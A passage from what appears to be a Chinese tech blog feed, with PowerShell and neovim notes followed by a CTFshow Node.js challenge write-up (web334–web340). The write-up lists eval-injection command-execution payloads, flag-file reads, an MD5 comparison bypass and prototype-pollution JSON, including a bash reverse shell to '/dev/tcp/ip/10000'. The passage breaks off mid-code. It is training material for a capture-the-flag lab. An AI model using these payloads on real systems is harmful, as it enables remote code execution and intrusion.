class="variable">$n</span></span><br></pre></td></tr></table></figure><p>还有一些变量操作:</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看当前所有的变量</span></span><br><span class="line"><span class="built_in">ls</span> variable:    </span><br><span class="line"><span class="comment"># 查找特定的变量值(通配符)</span></span><br><span class="line"><span class="built_in">ls</span> variable:num*    </span><br><span class="line"><span class="built_in">ls</span> variable:num1</span><br><span class="line"><span class="comment"># 查找变量是否存在</span></span><br><span class="line"><span class="built_in">test-path</span> variable:num1    </span><br><span class="line"><span class="built_in">test-path</span> variable:num0</span><br><span class="line"><span class="comment"># 删除变量</span></span><br><span class="line"><span class="built_in">del</span> variable:num1    </span><br><span class="line"><span class="built_in">test-path</span> variable:num1</span><br><span class="line"><span class="comment"># 专用变量管理的命令</span></span><br><span class="line"><span class="built_in">clear-variable</span></span><br><span class="line"><span class="built_in">remove-variable</span></span><br><span class="line"><span class="built_in">new-variable</span></span><br></pre></td></tr></table></figure><h2 id="自动化变量"><a class="header-anchor" href="#自动化变量">¶</a>自动化变量</h2><p>powershell打开会自动加载变量, 例如: 窗口打开它会自动加载大小, 再比如程序的配置信息自动加载</p><blockquote><p>和下面的环境变量有些类似, 但是自动化变量仅在PowerShell会话或脚本运行时有效; 但是内容确实是一样的, 就放在环境变量了</p></blockquote><h2 id="环境变量"><a class="header-anchor" href="#环境变量">¶</a>环境变量</h2><p>给一些例子就行, 主要是自己创建和删除</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$HOME</span></span><br><span class="line"><span class="variable">$PID</span></span><br><span class="line"><span class="variable">$env</span></span><br></pre></td></tr></table></figure><p>环境变量操作</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打印特定环境变量值</span></span><br><span class="line"><span class="variable">$env:windir</span></span><br><span class="line"><span class="comment"># 创建新的环境变量</span></span><br><span class="line"><span class="variable">$env:name</span>=<span class="string">&#x27;a&#x27;</span></span><br><span class="line"><span class="built_in">ls</span> env:na*</span><br><span class="line"><span class="comment"># 删除环境变量</span></span><br><span class="line"><span class="built_in">del</span> env:name</span><br><span class="line"><span class="built_in">ls</span> env:na*</span><br><span class="line"><span class="comment"># 更新临时生效的环境变量</span></span><br><span class="line"><span class="variable">$env:OS</span>=<span class="string">&quot;Linux&quot;</span></span><br><span class="line"><span class="variable">$env:OS</span></span><br><span class="line"><span class="comment"># 永久生效</span></span><br><span class="line">[<span class="type">environment</span>]::setenvironmentvariable(<span class="string">&quot;PATH&quot;</span>,<span class="string">&quot;E:\&quot;</span>,<span class="string">&quot;User&quot;</span>)</span><br><span class="line">[<span class="type">environment</span>]::getenvironmentvariable(<span class="string">&quot;PATH&quot;</span>,<span class="string">&quot;User&quot;</span>)</span><br></pre></td></tr></table></figure><h1>脚本调用</h1><p>首先这个功能是被禁止的, 你得先打开</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 管理员身份执行:</span></span><br><span class="line"><span class="built_in">set-executionpolicy</span> RemoteSigned</span><br></pre></td></tr></table></figure><blockquote><p>可能你安装过oh my push, 它是个命令行美化脚本</p></blockquote><ol><li>调用<code>demo.bat</code>文件, 完成以上设置直接运行即可: <code>./demo.bat</code></li><li>调用vbs文件同理,  <code>./demo.vbs</code></li><li>powershell脚本更不需赘述</li></ol>]]></content>
      
      
      <categories>
          
          <category> 妙妙工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PowerShell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>neovim部分问题</title>
      <link href="/article/neovim-poblems/"/>
      <url>/article/neovim-poblems/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>查看插件和配置文件路径:</h1><p>如果用的vimscript</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:version</span><br><span class="line"># 高版本换了</span><br><span class="line">:verbose version</span><br><span class="line"># 如果存在就使用 $VIM/sysinit.vim</span><br><span class="line"># 找不到就 C:/Program Files(x86)/nvim/share/nvim</span><br><span class="line"># $VIM可以在vim利用以下命令输出</span><br><span class="line">:echo $VIM </span><br></pre></td></tr></table></figure><p>如果用的Lua, 进入到nvim下输入下面的命令查询配置文件路径</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:help init.lua</span><br><span class="line"># Unix: ~/.config/nvim/init.vimor lua</span><br><span class="line"># Windows: ~/AppData/Local/nvim/init.vim or lua</span><br></pre></td></tr></table></figure><h1>自检查系统配置</h1><p>一般用来看什么地方引起的报错</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:checkhealth</span><br></pre></td></tr></table></figure><h1>可能需要的字体:</h1><p>windows安装完字体在终端中右键设置, 修改默认值</p><p><a href="https://github.com/ryanoasis/nerd-fonts/tree/master/patched-fonts/Hack/Regular">https://github.com/ryanoasis/nerd-fonts/tree/master/patched-fonts/Hack/Regular</a></p><p><a href="https://github.com/ryanoasis/nerd-fonts/tree/master/patched-fonts/JetBrainsMono/Ligatures/Regular">https://github.com/ryanoasis/nerd-fonts/tree/master/patched-fonts/JetBrainsMono/Ligatures/Regular</a></p><h1>设置的键位</h1><p>自带的键位</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Normal 模式下按下 i 进入 Insert 模式</span><br><span class="line">Insert/Visual 模式下按下 Esc 进入 Normal 模式</span><br><span class="line">Normal 模式下按下 v 进入 Visual 模式</span><br><span class="line">Visual 模式下 y 复制，x 或者 c 剪贴，p 粘贴</span><br><span class="line">Normal 模式下 u 撤销（相当于 ctrl z）</span><br><span class="line">Normal 模式下输入 / 进入搜索模式，/hello+回车就是查找所有包含 hello 的字符串</span><br><span class="line">Normal 模式下 Ctrl + F 翻页，0 到行首，$到行尾</span><br><span class="line">Ctrl +/- 可以调整字体大小</span><br><span class="line"></span><br><span class="line">home/0 行首</span><br><span class="line">end 行尾</span><br></pre></td></tr></table></figure><p>更改后的键位</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看警告/错误: 空格+e</span><br><span class="line">取消高亮: 空格+nh</span><br></pre></td></tr></table></figure><h2 id="插件的键位"><a class="header-anchor" href="#插件的键位">¶</a>插件的键位</h2><p>左右上下切换窗口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Ctrl+h,j,k,l</span><br></pre></td></tr></table></figure><p>快速多行注释和单行注释</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc  单行</span><br><span class="line">gc  多行</span><br></pre></td></tr></table></figure><h3 id="文件树相关"><a class="header-anchor" href="#文件树相关">¶</a>文件树相关</h3><p>打开文件树</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">空格+t</span><br></pre></td></tr></table></figure><p>展开文件路径</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Tab</span><br></pre></td></tr></table></figure><p>文件操作</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a    新建文件</span><br><span class="line">e    重命名</span><br><span class="line">o    打开文件</span><br></pre></td></tr></table></figure><h3 id="自动补全"><a class="header-anchor" href="#自动补全">¶</a>自动补全</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tab 补全, 切换输入位置</span><br><span class="line">shift+tab 返回上一个输入位置</span><br><span class="line">空格+e 查看错误/警告信息</span><br><span class="line">空格+q 查看所有错误/警告信息</span><br><span class="line">[d 查看上一个错误 </span><br><span class="line">]d 查看下一个错误</span><br><span class="line"></span><br><span class="line">gD 跳转到类型定义</span><br><span class="line">gd 跳转到定义</span><br><span class="line">K 显示悬停信息</span><br><span class="line">空格+D 跳转到类型定义</span><br><span class="line">空格+rn 重命名符号</span><br><span class="line">gr 查看引用</span><br></pre></td></tr></table></figure><h3 id="Mason"><a class="header-anchor" href="#Mason">¶</a>Mason</h3><p>呼出菜单:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:Mason</span><br></pre></td></tr></table></figure><p>搜索语言html</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/html</span><br></pre></td></tr></table></figure><p>安装</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i</span><br></pre></td></tr></table></figure><h3 id="buffer"><a class="header-anchor" href="#buffer">¶</a>buffer</h3><p>切换标签</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shift+l</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 妙妙工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> neovim </tag>
            
            <tag> 配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web入门_nodejs</title>
      <link href="/article/ctfshow-webbasic-nodejs/"/>
      <url>/article/ctfshow-webbasic-nodejs/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>nodejs</h1><hr><p>先看这个: <a href="https://www.anquanke.com/post/id/236182">NodeJS从零开始到原型链污染</a>, 记得回来</p><h2 id="web334"><a class="header-anchor" href="#web334">¶</a>web334</h2><ul><li>描述: 开始nodejs</li></ul><p>重命名为1.zip, 解压得到<code>login.js</code>和<code>user.js</code>, 在<code>user.js</code>中可以得到账密<code>CTFSHOW : 123456</code></p><p><code>login.js</code>中却限定我们传入的name不能等于CTFSHOW, name的大写形式要强等于item.username, 也就是CTFSHOW</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> findUser = <span class="keyword">function</span>(<span class="params">name, password</span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> users.<span class="title function_">find</span>(<span class="keyword">function</span>(<span class="params">item</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> name!==<span class="string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.<span class="property">username</span> === name.<span class="title function_">toUpperCase</span>() &amp;&amp; item.<span class="property">password</span> === password;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>那就小写一些字母即可登录<code>CTFshow : 123456</code></p><p><a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">P神_Fuzz中的javascript大小写特性</a></p><h2 id="web335"><a class="header-anchor" href="#web335">¶</a>web335</h2><ul><li>描述: 开始nodejs</li></ul><p>查看源码, 发现提示<code>/?eval=</code></p><p>那就是命令执行了, js中不像php, 有自己的规范: <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/eval">eval()-javascript</a>; 本题可以用子进程执行命令: <a href="https://nodejs.cn/api/child_process.html#child-process">子进程 | Node.js API文档</a></p><p>下面是各式各样能执行ls命令的方法, 改一下命令即可获得flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?eval=require(&quot;child_process&quot;).execSync(&#x27;ls&#x27;)</span><br><span class="line"></span><br><span class="line">?eval=require(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;).toString()</span><br><span class="line"></span><br><span class="line">?eval=require(&quot;child_process&quot;)[&#x27;exe&#x27;%2B&#x27;cSync&#x27;](&#x27;ls&#x27;)</span><br><span class="line"></span><br><span class="line">?eval=require(&#x27;child_process&#x27;).spawnSync( &#x27;ls&#x27;, [ &#x27;./&#x27; ] ).stdout.toString()</span><br></pre></td></tr></table></figure><p>还有</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?eval=global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;ls&#x27;)</span><br><span class="line"></span><br><span class="line"># 这个函数可以读取文件和文件夹</span><br><span class="line">?eval=require(&#x27;fs&#x27;).readdirSync(&quot;.&quot;)</span><br><span class="line">?eval=require(&#x27;fs&#x27;).readFileSync(&#x27;./fl00g.txt&#x27;,&#x27;utf8&#x27;);</span><br><span class="line"></span><br><span class="line">//字符串拼接</span><br><span class="line">?eval=var s=&#x27;global.process.mainModule.constructor._lo&#x27;;var b=&quot;ad(&#x27;child_process&#x27;).ex&quot;;var c=&quot;ec(%27ls&gt;public/1.txt%27);&quot;;eval(s%2Bb%2Bc)%3B</span><br></pre></td></tr></table></figure><p>poc其中之一:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?eval=require(&quot;child_process&quot;).execSync(&#x27;tac fl00g.txt&#x27;)</span><br></pre></td></tr></table></figure><h2 id="web336"><a class="header-anchor" href="#web336">¶</a>web336</h2><ul><li>描述: 同上</li></ul><p>执行文件操作可以获取源码, 明显过滤了exec和load</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 获取当前执行文件的绝对路径</span><br><span class="line">?eval=__filename</span><br><span class="line">?eval=require(&quot;fs&quot;).readFileSync(&#x27;/app/routes/index.js&#x27;,&#x27;utf-8&#x27;)</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?eval=require( &#x27;child_process&#x27; ).spawnSync( &#x27;ls&#x27;, [ &#x27;.&#x27; ] ).stdout.toString()</span><br><span class="line">?eval=require( &#x27;child_process&#x27; ).spawnSync( &#x27;cat&#x27;, [ &#x27;f*&#x27; ] ).stdout.toString()</span><br><span class="line"># 同上题</span><br><span class="line">?eval=require(&quot;fs&quot;).readdirSync(&#x27;.&#x27;,&#x27;utf-8&#x27;)</span><br><span class="line">?eval=require(&quot;fs&quot;).readFileSync(&#x27;./fl001g.txt&#x27;,&#x27;utf-8&#x27;)</span><br></pre></td></tr></table></figure><h2 id="web337"><a class="header-anchor" href="#web337">¶</a>web337</h2><ul><li>描述: 为本题源码</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">md5</span>(<span class="params">s</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;md5&#x27;</span>)</span><br><span class="line">    .<span class="title function_">update</span>(s)</span><br><span class="line">    .<span class="title function_">digest</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;xxxxxxx&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> a = req.<span class="property">query</span>.<span class="property">a</span>;</span><br><span class="line">  <span class="keyword">var</span> b = req.<span class="property">query</span>.<span class="property">b</span>;</span><br><span class="line">  <span class="keyword">if</span>(a &amp;&amp; b &amp;&amp; a.<span class="property">length</span>===b.<span class="property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="title function_">md5</span>(a+flag)===<span class="title function_">md5</span>(b+flag))&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,&#123; <span class="attr">msg</span>: <span class="string">&#x27;tql&#x27;</span>&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>主要是<code>md5(a+flag) === md5(b+flag)</code>的绕过,</p><blockquote><p>js变量分为值类型(基本类型),引用数据类型(对象类型)</p></blockquote><p><code>a[x]=1&amp;b[x]=2</code> 相当于a和b都是引用数据类型(对象类型), 那么在<code>a+flag</code>和<code>b+flag</code> 时, 他们的结果就会都是<code>[object Object]flag&#123;xxx&#125;</code> , 那么md5值就是一样的</p><p>运行以下代码, 均会打印出<code>[object Object]flag&#123;xxx&#125;</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//a,b是对象</span></span><br><span class="line">a=&#123;<span class="string">&#x27;x&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">b=&#123;<span class="string">&#x27;x&#x27;</span>:<span class="string">&#x27;2&#x27;</span>&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p>如果传<code>a[0]=1&amp;b[0]=2</code>, 此时相当于创了个数组变量<code>a=[1], b=[2]</code>, 此时输出结果为<code>1flag&#123;xxx&#125;</code>和<code>2flag&#123;xxx&#125;</code></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//数组变量</span></span><br><span class="line">a=[<span class="number">1</span>]</span><br><span class="line">b=[<span class="number">2</span>]</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p>所以payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET:</span><br><span class="line">/?a[x]=1&amp;b[x]=2</span><br></pre></td></tr></table></figure><h2 id="web338"><a class="header-anchor" href="#web338">¶</a>web338</h2><ul><li>描述: 源码都给你</li></ul><p><code>/routes/login.js</code>是关键文件, 本题主要是原型链污染, 你可能需要一点资料先理解一下原型链污染</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//# 只取关键代码 </span></span><br><span class="line"><span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">utils.<span class="title function_">copy</span>(user,req.<span class="property">body</span>);</span><br><span class="line"><span class="keyword">if</span>(secert.<span class="property">ctfshow</span>===<span class="string">&#x27;36dboy&#x27;</span>)&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(flag);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>+<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(user)&#125;);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在<code>/utils/common.js</code>中找到了copy函数</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">copy</span>(<span class="params">object1, object2</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            <span class="title function_">copy</span>(object1[key], object2[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><code>utils.copy()</code>是一个简单的对象属性拷贝方法, 没有安全地处理对象合并, 存在原型链污染; 我们可以利用特殊的属性名指向对象的原型并对其进行修改</p><p><code>secert</code>和<code>user</code>都是对象, 它们都基于<code>Object.prototype</code>, 所以通过<code>user</code>进行原型链污染<code>Object.prototype</code>的话, 所有基于<code>Object.prototype</code>的对象都会受到污染</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;__proto__&quot;</span>:&#123;</span><br><span class="line">    <span class="string">&quot;ctfshow&quot;</span>:<span class="string">&quot;36dboy&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将其整合, 然后发包</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:<span class="string">&quot;pass&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__proto__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;ctfshow&quot;</span>:<span class="string">&quot;36dboy&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241012191708343.png" alt="image-20241012191708343"></p><h2 id="web339"><a class="header-anchor" href="#web339">¶</a>web339</h2><ul><li>描述: 源码都给你</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> sess = req.<span class="property">session</span>;</span><br><span class="line"><span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">utils.<span class="title function_">copy</span>(user,req.<span class="property">body</span>);</span><br><span class="line"><span class="keyword">if</span>(secert.<span class="property">ctfshow</span>===flag)&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(flag);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>+<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(user)&#125;);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码基本不变, 尝试像上一题一样利用:</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>:<span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>:<span class="string">&quot;pass&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__proto__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;ctfshow&quot;</span>:<span class="string">&quot;flag_here&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回了<code>/views/api.html</code>的内容, 并不能获取flag; 显然能污染但是这里操作不了东西, 找找其他的地方</p><p><code>api.html</code>的内容如下, 这个<code>&lt;%= query%&gt;</code>,可以在<code>/routes/api.js</code>中找到对应的定义</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;!<span class="variable constant_">DOCTYPE</span> <span class="variable constant_">HTML</span>&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">title</span>&gt;</span>CTFshow 新手入门题目 <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">&lt;%= query%&gt;</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>相比于上一题, 在<code>/routes/api.js</code>中有以下代码, 我们往query中构造payload即会在这段模板渲染的代码中实现RCE，因为query在函数体内执行了</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="comment">//# 没错就是下面这行</span></span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;api&#x27;</span>, &#123; <span class="attr">query</span>: <span class="title class_">Function</span>(query)(query)&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>现在先了解一下不同对象所生成的原型链, 其实不管也行, 因为所有变量的最顶层都是object</p><blockquote><p>没有某个键值对的时候，它会直接去寻找Object对象的属性当中这个键值对是否存在, 也就是直接在最顶层修改, 所有继承它的都会受到影响</p></blockquote><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> o = &#123;<span class="attr">a</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="comment">//# o对象直接继承了Object.prototype</span></span><br><span class="line"><span class="comment">//# o -&gt; Object.prototype</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> a = [<span class="string">&quot;yo&quot;</span>, <span class="string">&quot;whadup&quot;</span>, <span class="string">&quot;?&quot;</span>];</span><br><span class="line"><span class="comment">//# 数组都继承于 Array.prototype</span></span><br><span class="line"><span class="comment">//# a -&gt; Array.prototype -&gt; Object.prototype</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//# 函数都继承于 Function.prototype</span></span><br><span class="line"><span class="comment">//# f -&gt; Function.prototype -&gt; Object.prototype</span></span><br></pre></td></tr></table></figure><p>所以我们可以直接通过原型链污染query的值, 就给它塞一个反弹shell</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;__proto__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;query&quot;</span>:<span class="string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/10000 0&gt;&amp;1\&quot;&#x27;)&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//# 或</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;__proto__&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;query&quot;</span>:<span class="string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp;/dev/tcp/ip/10000 0&gt;&amp;1\&quot;&#x27;)&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接<code>require('child_process')</code>不行, 直接<code>bash -i</code>反弹shell也不行</p><blockquote><p>Function环境下没有require函数, 不过我们可以通过使用<code>process.mainModule.constructor._load</code>来代替require</p></blockquote><p>先向<code>/login</code>发包污染query，再到<code>/api</code>下发相同的请求触发反弹shell</p><p>我这个因为之前测试, 所以返回的是<code>/api.html</code>,可能会有不同</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241012202313402.png" alt="image-20241012202313402"></p><p>然后你就直接将<code>/login</code>改成<code>/api</code>再发包, 此时就连上了; 最后flag在<code>./routes/login.js</code>中</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20241012202721907.png" alt="image-20241012202721907"></p><h2 id="web340"><a class="header-anchor" href="#web340">¶</a>web340</h2><ul><li>描述: 源码都给你</li></ul><p>看起来很么都没变, 发现上一题的payload用不了, 原因是<code>user</code>变了</p><p>结合上一题的不同对象所生成的原型链, 我们只需要增加一层<code>__proto__</code>即可, 其他步骤大差不差</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> user = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">userinfo</span> = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="comment">//# 上一题此处为 let user = &#123;&#125;; , 为对象, 更改后为函数</span></span><br><span class="line">  <span class="comment">//# ...</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line">utils.<span class="title function_">copy</span>(user.<span class="property">userinfo</span>,req.<span class="property">body</span>);</span><br><span class="line"><span class="keyword">if</span>(user.<span class="property">userinfo</span>.<span class="property">isAdmin</span>)&#123;</span><br><span class="line"> res.<span class="title function_">end</span>(flag);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"> <span 